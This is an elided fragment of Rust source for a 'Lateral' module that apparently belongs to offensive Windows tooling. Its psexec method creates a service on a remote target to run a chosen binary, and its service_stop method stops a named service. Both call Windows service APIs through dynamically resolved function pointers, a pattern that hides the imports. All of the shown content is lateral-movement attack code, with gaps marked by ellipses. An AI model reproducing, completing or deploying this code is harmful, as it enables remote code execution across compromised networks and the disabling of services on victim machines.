...
impl Lateral {
    pub fn psexec(&self, target: &str, service_name: &str, binary_path: &str) -> Result<(), ()> {
        ...
        unsafe {
            ...
            if open_scm.is_null() || create_service.is_null() {
                return Err(());
            }

            type FnOpenSCManager = unsafe extern "system" fn(*const u8, *const u8, u32) -> HANDLE;
            type FnCreateService = unsafe extern "system" fn(
                HANDLE,
                *const u8,
                *const u8,
                u32,
            ...
            let mut target_c = Vec::from(target.as_bytes());
            target_c.push(0);
            ...
            let mut name_c = Vec::from(service_name.as_bytes());
            name_c.push(0);
            let mut bin_c = Vec::from(binary_path.as_bytes());
            bin_c.push(0);
    ...
    pub fn service_stop(&self, service_name: &str) -> Result<(), ()> {
        ...
        unsafe {
            ...
            if open_scm.is_null()
                || open_service.is_null()
                || control_service.is_null()
                || close_handle.is_null()
            {
                return Err(());
            }
            ...
            let mut name_c = Vec::from(service_name.as_bytes());
            name_c.push(0);
            let svc = core::mem::transmute::<_, FnOpenService>(open_service)(
                scm,
                name_c.as_ptr(),
                0xF01FF,
            );
            ...
            if !svc.is_null() {
                ...
                core::mem::transmute::<_, FnControlService>(control_service)(
                    svc,
                    0x1,
                    status.as_mut_ptr() as *mut c_void,
                ); // STOP
                core::mem::transmute::<_, FnCloseServiceHandle>(close_handle)(svc);
            }
            core::mem::transmute::<_, FnCloseServiceHandle>(close_handle)(scm);
